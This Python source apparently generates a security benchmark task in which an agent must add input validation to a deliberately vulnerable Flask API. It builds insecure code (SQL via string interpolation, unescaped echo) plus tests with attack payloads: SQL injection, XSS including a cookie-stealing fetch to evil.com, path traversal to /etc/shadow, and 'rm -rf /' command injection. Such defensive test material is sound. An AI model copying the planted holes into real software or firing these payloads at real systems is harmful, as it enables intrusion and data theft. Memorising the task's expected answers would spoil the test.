"""
Parameterized generator for SEC4: Input Validation.

Each seed produces:
- Different application type (user_registration, product_catalog, comment_system,
  search_api, file_upload)
- Different field sets with per-field validation rules (5-10 fields)
- Different attack vectors prominently present in the vulnerable code
- Same core vulnerability pattern: NO input validation on any user-supplied field

TNI Design (Pattern E - Compliance Rules):
  - brief.md: vague — "The web application has input validation issues. Add proper
    input sanitization."
  - spec.md: per-field validation rules (RFC5322 email, E.164 phone, max-100-char
    alphanumeric name, 0-150 int age, HTTPS-only URL, 12+ char password complexity),
    OWASP rules (no SQL injection chars in text fields, HTML encoding for display,
    parameterized queries)
  - workspace: app.py accepts anything; tests/test_validation.py verifies correct rules
"""
from __future__ import annotations

import json
import textwrap
from generators.base import TaskGenerator, GeneratedTask
from generators.primitives import SeededRandom

# ── Application type pools ────────────────────────────────────────────────────

APP_TYPES = [
    {
        "app_type": "user_registration",
        "app_title": "User Registration API",
        "endpoint": "/api/register",
        "func_name": "register_user",
        "description": "A user registration endpoint that accepts new account data.",
        "fields": [
            {
                "name": "email",
                "label": "Email address",
                "rule": "RFC 5322 format (must contain exactly one @, valid domain with dot, no spaces)",
                "owasp_rule": "Must not contain SQL metacharacters: ', \", ;, --, /*",
                "test_valid": '"alice@example.com"',
                "test_invalid_format": '"not-an-email"',
                "test_attack": '"alice@example.com\' OR 1=1--"',
            },
            {
                "name": "username",
                "label": "Username",
                "rule": "3-30 characters, alphanumeric and underscores only, must start with a letter",
                "owasp_rule": "No HTML special characters: <, >, &, \", '",
                "test_valid": '"alice_99"',
                "test_invalid_format": '"a!"',
                "test_attack": '"<script>alert(1)</script>"',
            },
            {
                "name": "password",
                "label": "Password",
                "rule": "Minimum 12 characters; must contain at least one uppercase letter, one lowercase letter, one digit, and one special character (!@#$%^&*)",
                "owasp_rule": "Must not be stored in plaintext; must be hashed before storage",
                "test_valid": '"Secure@Pass123"',
                "test_invalid_format": '"short"',
                "test_attack": '"password\'; DROP TABLE users;--"',
            },
            {
                "name": "age",
                "label": "Age",
                "rule": "Integer between 0 and 150 (inclusive)",
                "owasp_rule": "Must be a numeric type; string coercion must not be accepted silently",
                "test_valid": "25",
                "test_invalid_format": '"not_a_number"',
                "test_attack": '"-1"',
            },
            {
                "name": "phone",
                "label": "Phone number",
                "rule": "E.164 format: starts with +, followed by 7-15 digits (e.g., +12025551234)",
                "owasp_rule": "Must not contain shell metacharacters: ;, |, &, $, `",
                "test_valid": '"+12025551234"',
                "test_invalid_format": '"555-1234"',
                "test_attack": '"+1;rm -rf /"',
            },
        ],
    },
    {
        "app_type": "product_catalog",
        "app_title": "Product Catalog API",
        "endpoint": "/api/products",
        "func_name": "create_product",
        "description": "A product catalog endpoint that accepts new product listings.",
        "fields": [
            {
                "name": "name",
                "label": "Product name",
                "rule": "1-100 characters, alphanumeric and spaces only",
                "owasp_rule": "Must not contain HTML special characters: <, >, &, \", '",
                "test_valid": '"Widget Pro 2000"',
                "test_invalid_format": '""',
                "test_attack": '"<img src=x onerror=alert(1)>"',
            },
            {
                "name": "price",
                "label": "Price",
                "rule": "Positive number (float or int), maximum value 1,000,000",
                "owasp_rule": "Must be numeric; strings must be rejected",
                "test_valid": "29.99",
                "test_invalid_format": '"free"',
                "test_attack": '"-1"',
            },
            {
                "name": "sku",
                "label": "SKU",
                "rule": "Alphanumeric, 6-20 characters, may contain hyphens",
                "owasp_rule": "Must not contain SQL metacharacters: ', \", ;, --",
                "test_valid": '"WIDGET-001"',
                "test_invalid_format": '"AB"',
                "test_attack": '"SKU\' OR 1=1--"',
            },
            {
                "name": "description",
                "label": "Description",
                "rule": "0-1000 characters; HTML must be escaped before storage or display",
                "owasp_rule": "HTML-encode all output: & -> &amp;, < -> &lt;, > -> &gt;, \" -> &quot;",
                "test_valid": '"A great widget for all occasions."',
                "test_invalid_format": '"x" * 1001',
                "test_attack": '"<script>document.cookie</script>"',
            },
            {
                "name": "category",
                "label": "Category",
                "rule": "Must be one of: electronics, clothing, food, tools, other",
                "owasp_rule": "Allowlist validation; reject any value not in the allowlist",
                "test_valid": '"electronics"',
                "test_invalid_format": '"weapons"',
                "test_attack": '"electronics\'; DROP TABLE products;--"',
            },
            {
                "name": "image_url",
                "label": "Image URL",
                "rule": "Must be a valid HTTPS URL (scheme must be https://)",
                "owasp_rule": "Must not allow file://, http://, javascript:, or data: schemes (SSRF prevention)",
                "test_valid": '"https://cdn.example.com/widget.png"',
                "test_invalid_format": '"not-a-url"',
                "test_attack": '"http://internal-server/admin"',
            },
        ],
    },
    {
        "app_type": "comment_system",
        "app_title": "Comment System API",
        "endpoint": "/api/comments",
        "func_name": "post_comment",
        "description": "A comment system endpoint that accepts user-submitted comments.",
        "fields": [
            {
                "name": "author",
                "label": "Author name",
                "rule": "1-100 characters, alphanumeric and spaces only",
                "owasp_rule": "Must not contain HTML special characters: <, >, &, \", '",
                "test_valid": '"Jane Doe"',
                "test_invalid_format": '""',
                "test_attack": '"<script>alert(document.cookie)</script>"',
            },
            {
                "name": "content",
                "label": "Comment content",
                "rule": "1-2000 characters; HTML must be escaped before storage or display",
                "owasp_rule": "HTML-encode output; strip or escape: <script>, <iframe>, javascript: URIs",
                "test_valid": '"This is a great article!"',
                "test_invalid_format": '""',
                "test_attack": '"<img src=x onerror=fetch(\'https://evil.com/?\'+document.cookie)>"',
            },
            {
                "name": "email",
                "label": "Author email",
                "rule": "RFC 5322 format (must contain exactly one @, valid domain with dot)",
                "owasp_rule": "Must not contain SQL metacharacters: ', \", ;, --, /*",
                "test_valid": '"user@example.com"',
                "test_invalid_format": '"invalid"',
                "test_attack": '"user@example.com\' UNION SELECT password FROM users--"',
            },
            {
                "name": "post_id",
                "label": "Post ID",
                "rule": "Positive integer (greater than 0)",
                "owasp_rule": "Must be numeric; string coercion or negative values must be rejected",
                "test_valid": "42",
                "test_invalid_format": '"abc"',
                "test_attack": '"-1 OR 1=1"',
            },
            {
                "name": "website",
                "label": "Author website",
                "rule": "Optional; if provided, must be a valid HTTPS URL",
                "owasp_rule": "Must not allow javascript:, file://, or http:// schemes",
                "test_valid": '"https://example.com"',
                "test_invalid_format": '"javascript:alert(1)"',
                "test_attack": '"http://evil.com"',
            },
        ],
    },
    {
        "app_type": "search_api",
        "app_title": "Search API",
        "endpoint": "/api/search",
        "func_name": "search_items",
        "description": "A search endpoint that accepts user-supplied query parameters.",
        "fields": [
            {
                "name": "query",
                "label": "Search query",
                "rule": "1-200 characters; alphanumeric, spaces, hyphens, and underscores only",
                "owasp_rule": "Must not contain SQL metacharacters: ', \", ;, --, /* or HTML tags",
                "test_valid": '"widget pro"',
                "test_invalid_format": '""',
                "test_attack": '"x\' UNION SELECT username, password FROM users--"',
            },
            {
                "name": "page",
                "label": "Page number",
                "rule": "Integer between 1 and 10000 (inclusive)",
                "owasp_rule": "Must be numeric; string coercion or negative values must be rejected",
                "test_valid": "1",
                "test_invalid_format": '"first"',
                "test_attack": '"-1"',
            },
            {
                "name": "page_size",
                "label": "Page size",
                "rule": "Integer between 1 and 100 (inclusive)",
                "owasp_rule": "Must not exceed 100 to prevent resource exhaustion",
                "test_valid": "20",
                "test_invalid_format": '"all"',
                "test_attack": '"99999"',
            },
            {
                "name": "sort_by",
                "label": "Sort field",
                "rule": "Must be one of: name, price, date, relevance",
                "owasp_rule": "Allowlist validation; reject any value not in the allowlist (prevents ORDER BY injection)",
                "test_valid": '"name"',
                "test_invalid_format": '"hack"',
                "test_attack": '"name; DROP TABLE items;--"',
            },
            {
                "name": "category",
                "label": "Filter category",
                "rule": "Optional; if provided, must be one of: all, electronics, clothing, food, tools",
                "owasp_rule": "Allowlist validation; reject values not in the allowlist",
                "test_valid": '"electronics"',
                "test_invalid_format": '"weapons"',
                "test_attack": '"all\' OR \'1\'=\'1"',
            },
        ],
    },
    {
        "app_type": "file_upload",
        "app_title": "File Upload API",
        "endpoint": "/api/upload",
        "func_name": "upload_file",
        "description": "A file upload endpoint that accepts file metadata and stores files.",
        "fields": [
            {
                "name": "filename",
                "label": "File name",
                "rule": "1-255 characters, alphanumeric, dots, hyphens, underscores only; must not start with a dot",
                "owasp_rule": "Must not contain path traversal sequences: ../, .\\, or absolute paths starting with /",
                "test_valid": '"report_2024.pdf"',
                "test_invalid_format": '"../../etc/passwd"',
                "test_attack": '"../../../etc/shadow"',
            },
            {
                "name": "content_type",
                "label": "MIME type",
                "rule": "Must be one of: image/jpeg, image/png, application/pdf, text/plain",
                "owasp_rule": "Allowlist validation; reject all other MIME types to prevent polyglot attacks",
                "test_valid": '"image/jpeg"',
                "test_invalid_format": '"application/x-php"',
                "test_attack": '"image/jpeg; application/x-php"',
            },
            {
                "name": "file_size",
                "label": "File size (bytes)",
                "rule": "Integer between 1 and 10,485,760 (10 MB)",
                "owasp_rule": "Must be numeric and within bounds to prevent resource exhaustion",
                "test_valid": "1024",
                "test_invalid_format": '"big"',
                "test_attack": '"99999999999"',
            },
            {
                "name": "destination",
                "label": "Destination folder",
                "rule": "Must be one of: uploads, images, documents, temp",
                "owasp_rule": "Allowlist validation; reject any path not in the allowlist (path traversal prevention)",
                "test_valid": '"uploads"',
                "test_invalid_format": '"../../root"',
                "test_attack": '"/etc/cron.d"',
            },
            {
                "name": "uploader_email",
                "label": "Uploader email",
                "rule": "RFC 5322 format (must contain exactly one @, valid domain with dot)",
                "owasp_rule": "Must not contain SQL metacharacters: ', \", ;, --",
                "test_valid": '"uploader@example.com"',
                "test_invalid_format": '"not-email"',
                "test_attack": '"up@x.com\' OR 1=1--"',
            },
        ],
    },
]

# ── HTML encoding helper text ─────────────────────────────────────────────────

HTML_ENCODE_VARIANTS = [
    "html.escape(value)",
    "markupsafe.escape(value)",
    "cgi.escape(value)",
]

DB_QUERY_VARIANTS = [
    "cursor.execute('SELECT * FROM {table} WHERE id = ?', (item_id,))",
    "cursor.execute('SELECT * FROM {table} WHERE id = %s', (item_id,))",
    "db.query('SELECT * FROM {table} WHERE id = :id', {'id': item_id})",
]


class Generator(TaskGenerator):
    task_id = "SEC4_input_validation"
    domain = "security"
    difficulty = "hard"
    languages = ["python"]

    def generate(self, seed: int) -> GeneratedTask:
        rng = SeededRandom(seed)

        app = APP_TYPES[rng.randint(0, len(APP_TYPES) - 1)]
        html_encode = HTML_ENCODE_VARIANTS[rng.randint(0, len(HTML_ENCODE_VARIANTS) - 1)]
        table_name = app["app_type"].replace("_", "s_") + "s"
        db_query_tpl = DB_QUERY_VARIANTS[rng.randint(0, len(DB_QUERY_VARIANTS) - 1)]
        db_query = db_query_tpl.format(table=table_name)

        expected = {
            "app_type": app["app_type"],
            "fields": [f["name"] for f in app["fields"]],
            "validation_rules": {
                f["name"]: {
                    "rule": f["rule"],
                    "owasp_rule": f["owasp_rule"],
                }
                for f in app["fields"]
            },
            "required_fixes": [
                "per_field_validation",
                "sql_injection_prevention",
                "xss_prevention_html_encoding",
                "path_traversal_prevention",
                "allowlist_enforcement",
                "parameterized_queries",
            ],
            "attack_vectors": [
                "sql_injection",
                "xss",
                "path_traversal",
                "ssrf",
                "command_injection",
            ],
        }

        workspace_files = {
            "app.py": self._gen_app(app, db_query),
            "models.py": self._gen_models(app, table_name),
            "requirements.txt": self._gen_requirements(),
            "tests/__init__.py": "",
            "tests/test_validation.py": self._gen_tests(app),
        }

        return GeneratedTask(
            task_id=self.task_id,
            seed=seed,
            spec_md=self._gen_spec(app, html_encode, db_query),
            brief_md=self._gen_brief(app),
            expected=expected,
            workspace_files=workspace_files,
        )

    # ── workspace file generators ─────────────────────────────────────────────

    def _gen_app(self, app: dict, db_query: str) -> str:
        fields = app["fields"]
        field_names = [f["name"] for f in fields]
        extract_lines = "\n".join(
            f'    {f["name"]} = data.get("{f["name"]}")'
            for f in fields
        )
        missing_check_names = ", ".join(f'"{f["name"]}"' for f in fields if f["name"] not in ("website", "description", "category"))
        return f'''\
"""
{app["app_title"]} — {app["description"]}

WARNING: This implementation has NO input validation. All user-supplied
data is accepted as-is and inserted directly into the database. This
exposes the application to SQL injection, XSS, path traversal, and other
OWASP Top-10 vulnerabilities. Add proper validation before this can be
used in production.
"""
import sqlite3
import json
from flask import Flask, request, jsonify

app = Flask(__name__)
DB_PATH = "app.db"


def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


@app.route("{app["endpoint"]}", methods=["POST"])
def {app["func_name"]}():
    """
    Accept {app["description"].lower()}

    Expected JSON body fields: {", ".join(field_names)}
    """
    data = request.get_json(force=True) or {{}}

{extract_lines}

    # TODO: validate all fields before inserting
    # Currently accepts anything — vulnerable to injection attacks!

    conn = get_db()
    cursor = conn.cursor()

    # VULNERABLE: string interpolation in SQL query — susceptible to SQL injection
    field_list = ", ".join({json.dumps(field_names)})
    value_list = ", ".join([
        f"'{{val}}'" if isinstance(val, str) else str(val)
        for val in [{", ".join(f["name"] for f in fields)}]
    ])
    sql = f"INSERT INTO items ({{field_list}}) VALUES ({{value_list}})"
    cursor.execute(sql)
    conn.commit()
    conn.close()

    # VULNERABLE: returns raw user input in response — susceptible to XSS
    response_data = {{
        "status": "created",
        "data": {{k: data.get(k) for k in {json.dumps(field_names)}}},
    }}
    return jsonify(response_data), 201


@app.route("{app["endpoint"]}/<int:item_id>", methods=["GET"])
def get_item(item_id):
    """Retrieve a single item by ID."""
    conn = get_db()
    cursor = conn.cursor()
    # VULNERABLE: no parameterized query — but item_id is int so lower risk here
    cursor.execute(f"SELECT * FROM items WHERE id = {{item_id}}")
    row = cursor.fetchone()
    conn.close()
    if row is None:
        return jsonify({{"error": "Not found"}}), 404
    return jsonify(dict(row)), 200


if __name__ == "__main__":
    app.run(debug=True)
'''

    def _gen_models(self, app: dict, table_name: str) -> str:
        fields = app["fields"]
        col_defs = "\n    ".join(
            f"{f['name']} TEXT,"
            for f in fields
        )
        return f'''\
"""Database model initialization for {app["app_title"]}."""
import sqlite3

DB_PATH = "app.db"

CREATE_TABLE = """
CREATE TABLE IF NOT EXISTS items (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    {col_defs}
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
"""


def init_db():
    """Initialize the database schema."""
    conn = sqlite3.connect(DB_PATH)
    conn.execute(CREATE_TABLE)
    conn.commit()
    conn.close()


if __name__ == "__main__":
    init_db()
    print("Database initialized.")
'''

    def _gen_requirements(self) -> str:
        return """\
Flask>=2.3.0
pytest>=7.4.0
"""

    def _gen_tests(self, app: dict) -> str:
        fields = app["fields"]
        endpoint = app["endpoint"]

        # Build valid payload from fields
        valid_payload_parts = []
        for f in fields:
            valid_payload_parts.append(f'        "{f["name"]}": {f["test_valid"]}')
        valid_payload = ",\n".join(valid_payload_parts)

        # Build individual field test cases
        test_cases = []
        for f in fields:
            fname = f["name"]
            label = f["label"]
            rule = f["rule"]
            test_cases.append(f'''\
    def test_{fname}_rejects_invalid_format(self):
        """Reject {label} that violates rule: {rule[:60]}"""
        payload = self._valid_payload()
        payload["{fname}"] = {f["test_invalid_format"]}
        resp = self.client.post(
            "{endpoint}",
            data=json.dumps(payload),
            content_type="application/json",
        )
        self.assertIn(resp.status_code, [400, 422],
            f"Expected 400/422 for invalid {fname}, got {{resp.status_code}}")

    def test_{fname}_rejects_attack(self):
        """Reject {label} containing an attack payload."""
        payload = self._valid_payload()
        payload["{fname}"] = {f["test_attack"]}
        resp = self.client.post(
            "{endpoint}",
            data=json.dumps(payload),
            content_type="application/json",
        )
        self.assertIn(resp.status_code, [400, 422],
            f"Expected 400/422 for attack in {fname}, got {{resp.status_code}}")
''')

        # Build valid payload helper
        valid_payload_method = f"""\
    def _valid_payload(self):
        return {{
{valid_payload}
        }}
"""

        return f'''\
"""
Validation tests for {app["app_title"]}.

These tests verify that the application correctly rejects invalid and
malicious inputs according to OWASP input validation rules. All tests
should pass after proper validation is implemented.
"""
import json
import unittest
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app import app


class TestInputValidation(unittest.TestCase):

    def setUp(self):
        app.config["TESTING"] = True
        self.client = app.test_client()

{valid_payload_method}
    def test_valid_payload_accepted(self):
        """A fully valid payload must be accepted (HTTP 201)."""
        payload = self._valid_payload()
        resp = self.client.post(
            "{endpoint}",
            data=json.dumps(payload),
            content_type="application/json",
        )
        self.assertEqual(resp.status_code, 201,
            f"Valid payload rejected: {{resp.get_data(as_text=True)}}")

    def test_empty_body_rejected(self):
        """An empty request body must be rejected (HTTP 400)."""
        resp = self.client.post(
            "{endpoint}",
            data=json.dumps({{}}),
            content_type="application/json",
        )
        self.assertIn(resp.status_code, [400, 422],
            f"Empty body not rejected: {{resp.status_code}}")

    def test_response_does_not_echo_raw_sql_chars(self):
        """Response must not reflect raw SQL injection chars back unescaped."""
        payload = self._valid_payload()
        # Inject SQL into first text field
        first_text_field = list(payload.keys())[0]
        payload[first_text_field] = "test'; DROP TABLE items;--"
        resp = self.client.post(
            "{endpoint}",
            data=json.dumps(payload),
            content_type="application/json",
        )
        # Either rejected (400/422) or content sanitized
        if resp.status_code == 201:
            body = resp.get_data(as_text=True)
            self.assertNotIn("DROP TABLE", body,
                "SQL injection payload echoed back in response")

    def test_response_does_not_echo_raw_html(self):
        """Response must not reflect raw HTML/script tags back unescaped."""
        payload = self._valid_payload()
        first_text_field = list(payload.keys())[0]
        payload[first_text_field] = "<script>alert(1)</script>"
        resp = self.client.post(
            "{endpoint}",
            data=json.dumps(payload),
            content_type="application/json",
        )
        if resp.status_code == 201:
            body = resp.get_data(as_text=True)
            self.assertNotIn("<script>", body,
                "Raw <script> tag echoed back in response (XSS risk)")

{"".join(test_cases)}

if __name__ == "__main__":
    unittest.main()
'''

    # ── doc generators ────────────────────────────────────────────────────────

    def _gen_spec(self, app: dict, html_encode: str, db_query: str) -> str:
        fields = app["fields"]
        field_table_rows = "\n".join(
            f"| `{f['name']}` | {f['label']} | {f['rule']} | {f['owasp_rule']} |"
            for f in fields
        )

        field_sections = ""
        for f in fields:
            field_sections += f"""
### Field: `{f['name']}` ({f['label']})

- **Format rule**: {f['rule']}
- **OWASP rule**: {f['owasp_rule']}
- **Valid example**: `{f['test_valid']}`
- **Invalid format example**: `{f['test_invalid_format']}`
- **Attack example** (must be rejected with 400): `{f['test_attack']}`
"""

        return f"""\
# SEC4: Input Validation — Full Specification (Planner/Verifier Only)

## Overview

The `{app["app_title"]}` (`{app["endpoint"]}`) accepts user-supplied data with **no input
validation whatsoever**. Every field must be validated per the rules below before the
application can be considered secure. This spec lists the exact per-field validation
rules, OWASP-specific requirements, and grading criteria.

---

## Application Context

- **Endpoint**: `POST {app["endpoint"]}`
- **Handler function**: `{app["func_name"]}()` in `app.py`
- **Description**: {app["description"]}

---

## Per-Field Validation Rules

| Field | Label | Format Rule | OWASP Rule |
|-------|-------|-------------|------------|
{field_table_rows}

---

## Detailed Field Specifications
{field_sections}

---

## OWASP-Specific Requirements

### 1. SQL Injection Prevention (OWASP A03:2021)

The current implementation builds SQL queries via string interpolation:

```python
sql = f"INSERT INTO items ({{field_list}}) VALUES ({{value_list}})"
cursor.execute(sql)
```

**Required fix**: All database queries must use parameterized queries with
placeholders (`?` for sqlite3 or `%s` for psycopg2). No user-supplied value
may appear directly in the SQL string. Example:

```python
{db_query}
```

### 2. XSS Prevention — HTML Encoding (OWASP A03:2021)

Any user-supplied string returned in an API response or rendered in HTML
**must** be HTML-encoded. Use `{html_encode}` or equivalent. Characters
that must be encoded:

| Character | Encoded form |
|-----------|-------------|
| `&`       | `&amp;`     |
| `<`       | `&lt;`      |
| `>`       | `&gt;`      |
| `"`       | `&quot;`    |
| `'`       | `&#x27;`    |

### 3. Path Traversal Prevention (OWASP A01:2021)

File names and directory paths must be validated with an allowlist. Reject
any value containing `../`, `.\\`, or that starts with `/` or a drive letter
(`C:\\`). Only the characters `[A-Za-z0-9._-]` are permitted in file names.

### 4. SSRF Prevention (OWASP A10:2021)

URL fields must only accept the `https://` scheme. Reject `http://`,
`file://`, `ftp://`, `javascript:`, `data:`, and bare hostnames.

### 5. Command Injection Prevention (OWASP A03:2021)

Fields used in system calls must not contain shell metacharacters:
`;`, `|`, `&`, `$`, `` ` ``, `\\n`, `\\r`. Allowlist-validate or strip these
before passing any user data to `subprocess`, `os.system`, or similar.

---

## Validation Response Requirements

- **HTTP 400** (or 422) for any field that fails validation.
- Error message must name the failing field and describe the rule violation.
- Error message must **not** expose internal details (stack traces, SQL, file paths).
- **HTTP 201** for fully valid payloads (do not break the happy path).

---

## Fix Requirements Summary

| # | Vulnerability | Location | Required Change |
|---|--------------|----------|-----------------|
| 1 | Missing per-field validation | `app.py` → `{app["func_name"]}()` | Validate each field per rules above |
| 2 | SQL injection via string interpolation | `app.py` | Replace with parameterized queries |
| 3 | XSS via unencoded output | `app.py` | HTML-encode all user data in responses |
| 4 | Path traversal in filenames/paths | `app.py` | Allowlist-validate; reject `../` sequences |
| 5 | SSRF via HTTP URLs | `app.py` | Require `https://` scheme for URL fields |
| 6 | No error on empty/missing body | `app.py` | Return 400 for missing required fields |

## Deliverables

The Executor must add validation to `{app["func_name"]}()` so that:
1. Every field is validated per the table above.
2. SQL queries use parameterized placeholders.
3. User data is HTML-encoded in responses.
4. `tests/test_validation.py` passes with zero failures.
"""

    def _gen_brief(self, app: dict) -> str:
        return f"""\
# SEC4: Input Validation (Executor Brief)

The `{app["app_title"]}` has input validation issues flagged in a security review.
Add proper input sanitization. The Planner has the per-field validation rules.

**Your workspace contains**:
- `app.py` — Flask web application with `{app["func_name"]}()` endpoint (`{app["endpoint"]}`)
- `models.py` — Database model initialization
- `requirements.txt` — Python dependencies
- `tests/test_validation.py` — Validation tests that must pass after your fix

**Do not** change the public API surface (URL paths, request/response shapes).
Make the tests in `tests/test_validation.py` pass.
"""
